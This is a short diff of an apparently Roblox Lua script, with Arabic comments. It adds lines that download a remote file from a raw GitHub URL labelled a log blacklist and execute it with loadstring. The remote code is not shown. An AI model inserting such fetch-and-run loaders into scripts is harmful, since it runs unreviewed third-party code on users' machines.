@@ -7,6 +7,9 @@ wait(1.5)
 game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer)
 
 -- اللوج بلاك ليست
+local url = "https://raw.githubusercontent.com/7yd7/7yd7/main/log-blacklist" -- اللوج
+loadstring(game:HttpGet(url))()
+wait(999)
 end
 
 
